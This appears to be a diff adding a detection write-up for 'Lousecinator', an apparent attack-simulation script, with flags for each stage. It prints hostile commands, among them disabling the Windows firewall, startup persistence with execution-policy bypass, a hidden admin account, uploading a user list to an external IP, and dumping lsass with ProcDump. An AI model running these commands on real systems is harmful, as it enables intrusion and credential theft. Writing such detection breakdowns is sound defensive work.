@@ -1,0 +1,169 @@
+## 🔍 Lousecinator - Detection & Flags Breakdown
+
+### 2. 🗂️ Mass File Creation & Obfuscation
+Creates 50 random `.txt` files in:
+
+```
+$env:USERPROFILE\Desktop\RandomFiles
+```
+
+Each file contains demo text and a number.
+
+Then:
+- Content is read as bytes
+- Base64 encoded
+- Renamed with `.lousecinator` extension
+- Original `.txt` files are deleted
+
+✅ **Flags**:
+- File creation burst  
+- Encoding patterns  
+- Suspicious new file extension (`.lousecinator`)
+
+---
+
+### 3. ⚙️ Persistence via Startup Folder
+Creates a `.lnk` shortcut in the Startup folder:
+
+**Target:**
+```powershell
+powershell.exe -ExecutionPolicy Bypass -File <script>
+```
+
+✅ **Flags**:
+- Bypassing PowerShell execution policy  
+- Startup persistence  
+- Unsigned PowerShell script in autorun
+
+---
+
+### 4. 👤 Unauthorized User Creation + Privilege Escalation
+Creates a new local user `MisteBean`  
+Adds it to the **Administrators** group  
+Uses weak, default-style password: `P@ssw0rd!`
+
+✅ **Flags**:
+- `New-LocalUser` with plaintext password  
+- Addition to admin group  
+- Suspicious username  
+
+---
+
+### 5. 🧠 System Reconnaissance
+Collects:
+- Domain membership status
+- Manufacturer, model, RAM
+- OS caption, version, architecture
+- Installed AV product (via WMI/CIM)
+- Uptime calculation
+- Local IPv4 address
+
+**Data is written to a _randomized folder_ on `C:\`**
+
+✅ **Flags**:
+- System profiling  
+- Host reconnaissance  
+- File output to suspicious directory  
+
+---
+
+### 6. 🔥 Disabling Windows Firewall
+**Command:**
+```powershell
+netsh advfirewall set allprofiles state off
+```
+
+✅ **Flags**:
+- Critical security control disabled  
+- Typical prelude to lateral movement or persistence  
+
+---
+
+### 7. 🐶 Meme Distraction (Psychological Decoy)
+Downloads the **"This is fine"** meme from CBC’s CDN:
+
+**URL:**
+```
+https://i.cbc.ca/1.6713656.1679693029!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_1180/this-is-fine.jpg?im=Resize%3D780
+```
+
+**Resolves to IP:** `23.222.11.76` (Akamai CDN)
+
+- Stored in: `$env:TEMP\this-is-fine.jpg`
+- Set as desktop wallpaper using `SystemParametersInfo` via interop
+
+✅ **Flags**:
+- External HTTP request to CDN  
+- File write to TEMP  
+- Desktop wallpaper modification via API call  
+- Meme as distraction tactic  
+
+---
+
+### 8. 🧾 Account Enumeration
+Uses `net user` or `net user /domain` depending on domain status.  
+Parses and writes result to:
+
+```
+C:\<random>\domain_users.txt
+or
+C:\<random>\local_users.txt
+```
+
+✅ **Flags**:
+- Account enumeration  
+- File output to randomized location  
+- Possible staging for exfil  
+
+---
+
+### 9. 🌐 Data Exfiltration
+Uploads the user list to external IP:
+
+**Command:**
+```powershell
+Invoke-WebRequest -Uri https://23.155.184.29/upload -Method Post -InFile $file
+```
+
+✅ **Flags**:
+- External IP (non-domain, untrusted)  
+- Clear exfiltration over HTTPS  
+
+---
+
+### 10. 🧠 Credential Dumping
+Downloads **ProcDump** from:
+
+```
+https://download.sysinternals.com/files/Procdump.zip
+```
+
+Then:
+```powershell
+procdump.exe -accepteula -ma <PID> <dump path>
+```
+
+Stores dump in `%TEMP%`, targeting `lsass`.
+
+✅ **Flags**:
+- ProcDump targeting `lsass`  
+- Usage of `-accepteula` for stealth  
+- Tool download and extract at runtime  
+
+---
+
+### 11. ⚠️ Visual HTML Defacement
+Drops custom HTML file with:
+- Glowing red/black theme  
+- Shaky animation via CSS  
+- Message warning the user
+
+**File path:**
+```
+$env:USERPROFILE\Desktop\Lousecinator_Info.html
+```
+
+✅ **Flags**:
+- HTML drop on Desktop  
+- Visual intimidation or notification tactic  
+- Behavior seen in scareware, wipers, and some ransomware variants  
